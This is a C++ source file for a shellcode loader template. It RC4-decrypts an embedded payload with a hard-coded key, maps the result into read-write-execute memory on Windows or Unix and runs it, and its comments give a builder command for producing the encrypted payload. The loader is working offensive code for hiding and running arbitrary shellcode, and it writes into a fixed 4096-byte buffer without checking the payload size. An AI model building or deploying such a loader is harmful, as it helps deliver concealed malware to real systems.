/*
 * rc4_loader.cpp - RC4 stream-cipher shellcode loader template
 * ============================================================
 * Decrypts an embedded RC4 blob (KSA + PRGA, length-preserving) and
 * executes it as a function. RC4 encryption == decryption.
 *
 * Build-time parameters (see payloads/rc4_300b.meta.json):
 *   key : deadbeefcafebabefeedfacec0ffee00 (16 B)
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m rc4 --key-hex -k dead...ee00 \
 *       --verify --meta params.json -f c -o payload_inc.h
 *
 * Compile: g++ -O2 -Wall -o rc4_loader rc4_loader.cpp
 */
#include <cstdint>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "payload_inc.h" /* kEncrypted[], kEncryptedLen, kOriginalLen */

static const uint8_t kKey[16] = {
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0xfe, 0xed, 0xfa, 0xce, 0xc0, 0xff, 0xee, 0x00
};

static void rc4_crypt(const uint8_t *in, uint8_t *out, size_t len) {
    uint8_t s[256];
    for (unsigned i = 0; i < 256; i++) s[i] = (uint8_t)i;
    unsigned j = 0;
    for (unsigned i = 0; i < 256; i++) { /* KSA */
        j = (j + s[i] + kKey[i % sizeof(kKey)]) & 0xff;
        uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
    }
    unsigned i = 0;
    j = 0;
    for (size_t k = 0; k < len; k++) { /* PRGA */
        i = (i + 1) & 0xff;
        j = (j + s[i]) & 0xff;
        uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
        out[k] = in[k] ^ s[(s[i] + s[j]) & 0xff];
    }
}

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    rc4_crypt(kEncrypted, plain, kEncryptedLen);
    printf("[+] RC4 decrypted %u bytes\n", kEncryptedLen);
    int r = run_payload(plain, kEncryptedLen);
    printf("[+] payload returned %d\n", r);
    return 0;
}
